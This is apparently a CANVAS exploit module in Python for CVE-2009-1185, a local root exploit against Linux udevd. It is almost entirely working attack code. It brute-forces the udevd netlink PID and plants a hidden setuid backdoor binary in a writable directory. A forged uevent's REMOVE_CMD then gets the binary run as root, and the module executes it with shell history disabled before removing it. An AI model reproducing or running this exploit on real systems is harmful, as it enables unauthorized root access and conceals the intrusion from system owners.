#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import time
import random
if "." not in sys.path: 
    sys.path.append(".")

from exploitutils import *
from MOSDEF import mosdef
from ExploitTypes.localexploit import LocalExploit

NOTES = """
udevd NETLINK messaging exploit
"""

NAME                            = "udevd"
DESCRIPTION                     = "udevd NETLINK messaging exploit"

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Linux"
DOCUMENTATION["Date public"]    = "04-17-2009"
DOCUMENTATION["CVE Name"]       = "CVE-2009-1185"
DOCUMENTATION["CVE Url"]        = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185"
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION["References"]     = ["http://c-skills.blogspot.com/2009/04/udev-trickery-cve-2009-1185-and-cve.html"]
DOCUMENTATION["Notes"]          = ""
VERSION                         =  "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Linux",  "i386"] ]

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name       = NAME
        self.udevd_ppid = 0
        self.netlink_fd = 0

    def open_NETLINK(self, node):
        vars = {'PF_NETLINK' : node.shell.libc.getdefine('PF_NETLINK'),\
                'SOCK_DGRAM' : node.shell.libc.getdefine('SOCK_DGRAM'),\
                'NETLINK_KOBJECT_UEVENT' : node.shell.libc.getdefine('NETLINK_KOBJECT_UEVENT')}
        code = """
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        
        #import "int", "PF_NETLINK" as "PF_NETLINK"
        #import "int", "SOCK_DGRAM" as "SOCK_DGRAM"
        #import "int", "NETLINK_KOBJECT_UEVENT" as "NETLINK_KOBJECT_UEVENT"
        
        void main(void)
        {
            int fd;
            
            fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
            sendint(fd);
            return;
        }
        """
        ret = node.shell.runCode(code, vars)
        if ret == -1:
            self.log("[-] could not get NETLINK fd")
        else:
            self.log("[+] NETLINK fd: %d" % ret)
        return ret
    
    def close_NETLINK(self, node, fd):
        vars = { 'fd' : fd }
        code = """
        #import "local", "close" as "close"
        #import "local", "sendint" as "sendint"
        
        #import "int", "fd" as "fd"
        
        void main()
        {
            close(fd);
            sendint(0);
        }
        """
        return node.shell.runCode(code, vars)
         
    def send_ACTION(self, node, fd, udev_msg, udev_ppid=0):
        msg_buf = ''
        # transform to envbuf
        msg_buf = ''
        for line in udev_msg:
            msg_buf += line + '\x00'
        vars = {'fd' : fd,\
                'udev_msg' : msg_buf,\
                'udev_msg_len' : len(msg_buf),\
                'udev_ppid' : udev_ppid,\
                'AF_NETLINK' : node.shell.libc.getdefine('AF_NETLINK')}
        code = """
        #import "local", "sendmsg" as "sendmsg"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"        
        
        #import "string", "udev_msg" as "udev_msg"
        #import "int", "udev_msg_len" as "udev_msg_len"
        #import "int", "udev_ppid" as "udev_ppid"
        #import "int", "fd" as "fd"
        
        #import "int", "AF_NETLINK" as "AF_NETLINK"
        
        // XXX: relying on X86 sizeof(types)
        
        struct iovec 
        {
            void   *iov_base;       // Starting address
            int     iov_len;        // Number of bytes
        }; 
        
        struct msghdr 
        {
            void   *msg_name;       // optional address
            int     msg_namelen;    // size of address
            void   *msg_iov;        // scatter/gather array
            int     msg_iovlen;     // # elements in msg_iov
            void   *msg_control;    // ancillary data, see below
            int     msg_controllen; // ancillary data buffer len
            int     msg_flags;      // flags on received message
        };
        
        struct sockaddr_nl
        {
            short   nl_family;      // AF_NETLINK
            short   nl_pad;         // zero
            int     nl_pid;         // pid
            int     nl_groups;      // multicast groups mask
        };
        
        void main()
        {
            int pid;
            int ret;
            struct sockaddr_nl sa;
            struct msghdr msg;
            struct iovec iov;
            
            pid = udev_ppid;

            memset(&sa, 0, 12);
            sa.nl_family = AF_NETLINK;
            sa.nl_pid = 0;
            iov.iov_base = udev_msg;
            iov.iov_len = udev_msg_len;
            memset(&msg, 0, 28);
            msg.msg_name = &sa;
            msg.msg_namelen = 12;
            msg.msg_iov = &iov;
            msg.msg_iovlen = 1;
            
            // already found pid
            if (pid != 0)
            {
                sa.nl_pid = pid;
                ret = sendmsg(fd, &msg, 0);
                if (ret < 0)
                {
                    pid = 0xffff;
                }
            }
            // brute pid
            else
            {
                while(pid < 0xffff)
                {
                    sa.nl_pid = pid;
                    ret = sendmsg(fd, &msg, 0);
                    if (ret > 0)
                    {
                        sendint(pid);
                        return;
                    }
                    pid = pid + 1;
                }
            }
            
            sendint(pid);
            return;
        }
        """        
        ret = node.shell.runCode(code, vars)
        if ret != 0xffff:
            self.log("[+] sendmsg succeeded to pid: %d" % ret)
            # so we dont have to repeat the PID brute
            self.udevd_ppid = ret
        else:
            self.log("[-] sendmsg failed\n");
        return ret
    
    def make_remote_escale_binary(self, node, filename):
        code = file("backdoors/mosdef_escale_666.c").read()
        vars = node.shell.libc.getdefines()
        vars['SOCK']        = int(node.shell.fd)
        vars['FILENAME']    = filename
        return self.make_remote_binary(node, code, vars)
    
    def make_remote_binary(self, node, code, vars):
        node.shell.clearfunctioncache() 
        bincode = node.shell.compile(code, vars)
        from MOSDEF.makeexe import makelinuxexe
        binexe = makelinuxexe(bincode, proc = node.shell.arch.upper())
        self.log("[+] escale ELF size: %d" % len(bincode))
        return binexe
    
    def upload_binary(self, node, code, filename):
        O_RDWR  = node.shell.libc.getdefine('O_RDWR')
        O_CREAT = node.shell.libc.getdefine('O_CREAT')
        node.shell.unlink(filename)
        fd = node.shell.open(filename, O_RDWR|O_CREAT, 0777)
        if fd < 0:
            self.log("[-] couldn't open %s..." % filename)
            return 0
        self.log("[+] %s opened as fd=%d" % (filename, fd))
        r = node.shell.write(fd, code)
        if r != 1:
            self.log("[-] write failed.")
            return 0
        self.log("[+] file wrote successfully")
        r = node.shell.close(fd);
        if r == -1:
            self.log("[-] error while trying to close the fd")
        return 1
    
    def get_proc_mounts(self, node, filepath = "/proc/mounts"):
        infd = node.shell.open(filepath, node.shell.libc.getdefine('O_RDONLY'))
        if infd < 0:
            self.log("[+] could not open /proc/mounts for noexec check")
            return ""
        ret,fs = node.shell.fstat(infd)
        if ret != 0:
            self.log("[+] could not fstat /proc/mounts")
            return ""
        rsize = fs['st_size']
        self.log("[+] /proc/mounts size: %d bytes (0 size reads untill EOF)"% rsize)
        if rsize == 0: 
            rsize = -1
        mounts = node.shell.readfromfd(infd, rsize)
        self.log("[+] read %d bytes"% len(mounts))
        node.shell.close(infd)
        return mounts
    
    def get_writex_dir(self, node, search = True):
        self.log("[+] finding rwx basedirs for binary placement ..")
        dirchecks = [ '/dev/shm', '/tmp']
        uid, euid, gid, egid = node.shell.ids()
        if search == True:
            finddirs = node.shell.runcommand("/usr/bin/find / -maxdepth 2 -type d -uid %d"% uid)
            finddirs = finddirs.split('\n')
            for dir in finddirs:
                if 'Permission denied' not in dir and '/proc' not in dir and dir != "":
                    self.log("[+] adding found base dir of %s to dir checks .."% dir)
                    dirchecks.append(dir)             
        dirbase = []
        mounts = self.get_proc_mounts(node)
        if mounts != "":
            mounts = mounts.split('\n')
            for dir in dirchecks:
                noexec = False
                for mount in mounts:
                    if dir in mount and 'noexec' in mount:
                        self.log("[-] %s is mounted noexec .. skipping"% dir)
                        noexec = True
                if noexec == False:
                    dirbase.append(dir)
        else:
            self.log("[-] could not get /proc/mounts .. hoping for the best ..")
            dirbase = dirchecks
        writexFound = False
        for dir in dirbase:
            ret, st = node.shell.stat(dir)
            if ret != 0:
                continue
            self.log("[+] got writex mode: %o for dir: %s"% (st['st_mode'], dir))
            perms = "%o"% st['st_mode']
            if st['st_uid'] == uid or st['st_uid'] == euid:
                self.log("[+] uid match .. checking perms for user !")
                if perms[len(perms)-3] == '7':
                    writexFound = True
                    break
            if st['st_gid'] == gid or st['st_gid'] == egid:
                self.log("[+] gid match .. checking perms for group !")
                if perms[len(perms)-2] == '7':
                    writexFound = True
                    break
            self.log("[+] checking world perms ..")
            if perms[len(perms)-1] == '7':
                writexFound = True
                break
        if writexFound == False:
            self.log("[-] DID NOT FIND A WRITEX DIR !!! .. defaulting to /dev/shm ..")
            dir = "/dev/shm"
        return dir
    
    def run(self):
        """ This run happens on all nodes selected """
        self.setInfo("%s (in progress)" % (NAME))
        
        for node in self.argsDict["passednodes"]:            
            type        = node.nodetype
            nodename    = node.getname()
            caps        = node.capabilities
            
            if "linux" not in caps:
                self.log("Node %s not a Linux node..." % nodename)
                continue
            else:
                # check which exploit mode we need
                ret, remove_cmd = node.shell.stat("/etc/udev/rules.d/95-udev-late.rules")
                if ret == -1 or remove_cmd == None:
                    self.log("[-] can not perform REMOVE_CMD attack, wait for debugfs version")
                    return 0
                
                # find a wx location to put escale bin
                dir         = self.get_writex_dir(node)
                filename    = dir + '/.%d%d' % (node.shell.getpid(), random.randint(0, 0xffff))
                code        = self.make_remote_escale_binary(node, filename)
                if not self.upload_binary(node, code, filename):
                    self.log("[-] could not upload escale binary to node")
                    return 0
                
                # get existing /dev/random stat
                ret, dev_random = node.shell.stat("/dev/random")
                if ret == -1 or dev_random == None:
                    self.log("[-] error trying to stat /dev/random")
                    return 0
                old_major = (dev_random['st_rdev'] >> 8) & 0xff
                old_minor = dev_random['st_rdev'] & 0xff

                # open netlink fd
                self.netlink_fd = self.open_NETLINK(node)
                if self.netlink_fd == -1:
                    return 0
                
                # send ACTION message to trigger win
                action = []
                action.append('remove@')
                action.append('ACTION=remove')
                action.append('DEVPATH=/dev/random')
                action.append('REMOVE_CMD=%s' % filename)
                self.log("[+] triggering REMOVE_CMD")
                ret = self.send_ACTION(node,\
                                       self.netlink_fd,\
                                       action,\
                                       udev_ppid = self.udevd_ppid)
                if ret == 0xffff:
                    return 0

                # send ACTION message to restore fail
                action = []
                action.append('add@')
                action.append('ACTION=add')
                action.append('DEVPATH=/dev/random')
                action.append('SUBSYSTEM=char')
                action.append('MAJOR=%d' % old_major)
                action.append('MINOR=%d' % old_minor)
                self.log("[+] restoring /dev/random")
                ret = self.send_ACTION(node,\
                                       self.netlink_fd,\
                                       action,\
                                       udev_ppid = self.udevd_ppid)

                # close NETLINK
                self.log("[+] closing NETLINK fd")
                self.close_NETLINK(node, self.netlink_fd)
                
                # give REMOVE_CMD some time to run
                time.sleep(3)
                
                # check if we are win
                S_ISUID = 0x800
                ret, st = node.shell.stat(filename)
                if ret == -1 or st == None:
                    self.log("error trying to stat %s" % filename)
                    return 0
                
                # go for final kill and pro-tips
                if st['st_mode'] & S_ISUID and st['st_uid'] == 0:
                    self.log("[+] we are suid root and good to go ...")
                    ret = node.shell.execve(filename, ["mos'def!"], ["HISTFILE=/dev/null"])
                    # re-init ourselves with new privs \o/
                    node.shell.restart()
                    # clean up
                    ret = node.shell.unlink(filename)
                    if ret == -1:
                        self.log("[-] could'nt remove backdoor file (%s)" % filename)
                    else:
                        self.log("[+] backdoor file removed")
                    self.setInfo("%s (Succeeded)" % (NAME))
                    return 1
                            
        self.setInfo("%s (Failed)" % (NAME))
        return 0

if __name__=="__main__":
    print "This module is meant to be run only within CANVAS"
    
